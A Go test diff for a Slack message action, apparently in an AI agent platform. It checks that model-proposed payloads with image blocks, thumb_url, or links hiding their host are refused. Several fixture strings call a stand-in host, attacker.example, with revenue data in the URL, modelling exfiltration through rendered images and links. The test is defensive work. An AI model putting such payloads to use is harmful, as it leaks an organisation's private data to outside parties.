@@ -376,13 +376,27 @@ func TestSlackPackMessageFetchesNoURL(t *testing.T) {
 	if last["unfurl_links"] != false || last["unfurl_media"] != false {
 		t.Fatalf("previews stayed on: %v", last)
 	}
-	image := `{"channel":"C0123ABCD","text":"Chart","blocks":[{"type":"image","image_url":"https://attacker.example/p.png?d=revenue-4.2M","alt_text":"chart"}]}`
-	if status, sent := execute(image); !strings.HasPrefix(status, "failed|") || !strings.Contains(status, "attacker.example") || sent != 0 {
-		t.Fatalf("blocks with a model URL: %s, %d calls", status, sent)
+	refused := func(body, why string) {
+		t.Helper()
+		in, _ := jsParse([]byte(`{"orgId":"org","scope":"external","kind":"slack.message","status":"approved","workRunId":"` + runMine +
+			`","payload":{"operation":"post_message","body":` + body + `}}`))
+		before := rowText(t, db, `select count(*)::text from action_request`)
+		_, err := a.createActionRequestInGo(ctx, in.(*jsObj))
+		if err == nil || !strings.Contains(err.Error(), why) || rowText(t, db, `select count(*)::text from action_request`) != before {
+			t.Fatalf("%s was not refused when proposed: %v", body, err)
+		}
 	}
-	link := `{"channel":"C0123ABCD","text":"x","blocks":[{"type":"section","text":{"type":"mrkdwn","text":"<http://attacker.example/?q=1|report>"}}]}`
-	if status, sent := execute(link); !strings.HasPrefix(status, "failed|") || sent != 0 {
-		t.Fatalf("blocks with a link: %s, %d calls", status, sent)
+	refused(`{"channel":"C0123ABCD","text":"Chart","blocks":[{"type":"image","image_url":"https://attacker.example/p.png?d=revenue-4.2M","alt_text":"chart"}]}`, "an image block")
+	refused(`{"channel":"C0123ABCD","text":"x","attachments":[{"thumb_url":"https://attacker.example/t.png"}]}`, "thumb_url")
+	refused(`{"channel":"C0123ABCD","text":"x","blocks":[{"type":"section","text":{"type":"mrkdwn","text":"<http://attacker.example/?q=1|report>"}}]}`,
+		"hides its host attacker.example")
+	for _, body := range []string{
+		`{"channel":"C0123ABCD","text":"x","blocks":[{"type":"section","text":{"type":"mrkdwn","text":"<http://attacker.example/?q=1|report on attacker.example>"}}]}`,
+		`{"channel":"C0123ABCD","text":"x","blocks":[{"type":"actions","elements":[{"type":"button","text":{"type":"plain_text","text":"Open"},"url":"https://dash.acme.example/r"}]}]}`,
+	} {
+		if status, sent := execute(body); status != "executed|" || sent != 1 {
+			t.Fatalf("a link that shows its host failed after approval: %s, %d calls", status, sent)
+		}
 	}
 	plain := `{"channel":"C0123ABCD","text":"x","blocks":[{"type":"section","text":{"type":"mrkdwn","text":"*Revenue* is down 4%"}}]}`
 	if status, sent := execute(plain); status != "executed|" || sent != 1 {
